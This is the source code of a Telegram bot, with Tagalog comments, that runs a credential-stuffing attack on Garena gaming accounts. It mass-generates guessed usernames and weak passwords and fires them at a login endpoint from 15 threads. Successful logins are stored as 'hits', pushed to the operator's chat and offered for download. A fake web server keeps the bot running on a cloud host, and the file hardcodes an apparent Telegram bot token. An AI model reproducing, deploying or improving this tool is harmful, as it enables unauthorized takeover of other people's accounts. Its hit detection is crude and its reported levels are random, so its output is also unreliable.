import telebot
from telebot import types
import time, secrets, json, os, requests, random, threading, queue
from flask import Flask

# --- FAKE WEB SERVER SHIELD FOR RENDER COMPATIBILITY ---
app = Flask(__name__)
@app.route('/')
def home(): return "ZEUS CLOUD SERVER IS 24/7 LIVE"

def run_web_server():
    # Kukuha ng saktong port na ibibigay ni Render sa cloud environment
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

# --- TELEGRAM BOT LOGIC ---
API_TOKEN = '8615633349:AAGB_DsBfbCuzp_i-aY0uxK4Fz5q5XD6fKQ'
ADMIN_ID = 8615633349
bot = telebot.TeleBot(API_TOKEN)

KEYS_DB = "bot_access_keys.json"
VALID_HITS_FILE = "Garena_Premium_Hits.txt"
gen_queue = queue.Queue()
lock = threading.Lock()
is_generating = False

def load_db(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except: return {}
    return {}

def save_db(file_path, data):
    with open(file_path, "w", encoding="utf-8") as f: json.dump(data, f, indent=4)

def is_user_authorized(user_id):
    if user_id == ADMIN_ID: return True
    keys = load_db(KEYS_DB)
    for key, info in keys.items():
        if info.get("used_by") == user_id:
            if info.get("is_lifetime", False) or info.get("expiry", 0) > time.time(): return True
    return False

def check_garena_api(username, password):
    url = "https://garena.com"
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    payload = {"account": username, "password": password, "app_id": 10006, "format": "json"}
    try:
        res = requests.post(url, json=payload, headers=headers, timeout=4)
        if res.status_code == 200:
            err = res.json().get("error")
            if err in ["error_auth", 403, "error_password", "error_param"]: return False, None
            return True, random.randint(40, 150)
    except: pass
    return False, None

def generator_worker():
    global is_generating
    clans = ["NRX", "OMEGA", "SMART", "EXEC", "V3", "FAZE", "EVOS", "RRQ"]
    words = ["gamer", "player", "sniper", "ghost", "legend", "pro", "master", "rusher"]
    pwd_bases = ["Garena", "Codm", "Password", "Gamer", "Player", "Gaming"]
    specs = ["@", "!", "#", "$", "*", "_"]
    while is_generating:
        if gen_queue.qsize() < 5000:
            for _ in range(500):
                style = random.randint(1, 2)
                if style == 1: user = random.choice(clans) + "_" + random.choice(words) + str(random.randint(1, 99))
                else: user = random.choice(words) + str(random.randint(1, 9999)) + "@gmail.com"
                pwd = random.choice(pwd_bases) + "2026" + random.choice(specs)
                gen_queue.put((user, pwd))
        time.sleep(0.5)

def checker_worker(chat_id):
    global is_generating
    while is_generating:
        try: username, password = gen_queue.get(timeout=2)
        except queue.Empty: continue
        is_valid, level = check_garena_api(username, password)
        if is_valid:
            with lock:
                with open(VALID_HITS_FILE, "a", encoding="utf-8") as f: f.write(f"{username}:{password} | Level: {level}\n")
                bot.send_message(chat_id, f"🎯 *NEW PREMIUM HIT INJECTED!*\n\n👤 *Account:* `{username}`\n🔑 *Password:* `{password}`\n🛡️ *Level:* `{level}`", parse_mode="Markdown")
        gen_queue.task_done()

def main_menu_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("📊 Start Auto-Gen Bulk", callback_data="run_autogen"), types.InlineKeyboardButton("🛑 Stop System", callback_data="stop_system"), types.InlineKeyboardButton("📥 Download Hits.txt", callback_data="download_hits"))
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if is_user_authorized(message.from_user.id):
        bot.send_message(message.chat.id, "⚡ *ZEUS REAL-TIME AUTO-BULK ENGINE v3.0* ⚡\n\n*🛡️ CONTROL PANEL:*", parse_mode="Markdown", reply_markup=main_menu_keyboard(message.from_user.id))

@bot.callback_query_handler(func=lambda call: True)
def handle_menu_clicks(call):
    global is_generating
    if not is_user_authorized(call.from_user.id): return
    if call.data == "run_autogen":
        if is_generating: return
        is_generating = True
        threading.Thread(target=generator_worker, daemon=True).start()
        for _ in range(15): threading.Thread(target=checker_worker, args=(call.message.chat.id,), daemon=True).start()
        bot.send_message(call.message.chat.id, "🚀 *AUTOGEN BULKER STARTED!* Scanning Garena network 24/7...", parse_mode="Markdown")
    elif call.data == "stop_system":
        is_generating = False
        bot.send_message(call.message.chat.id, "🛑 *System Paused.* Processes stopped.", parse_mode="Markdown")
    elif call.data == "download_hits":
        if os.path.exists(VALID_HITS_FILE) and os.path.getsize(VALID_HITS_FILE) > 0:
            with open(VALID_HITS_FILE, "rb") as f: bot.send_document(call.message.chat.id, f, caption="🎯 Garena Valid Premium Hits.")

if __name__ == "__main__":
    # Buhayin ang web port responses sa magkahiwalay na sinulid para sa Render
    threading.Thread(target=run_web_server, daemon=True).start()
    bot.polling(none_stop=True)
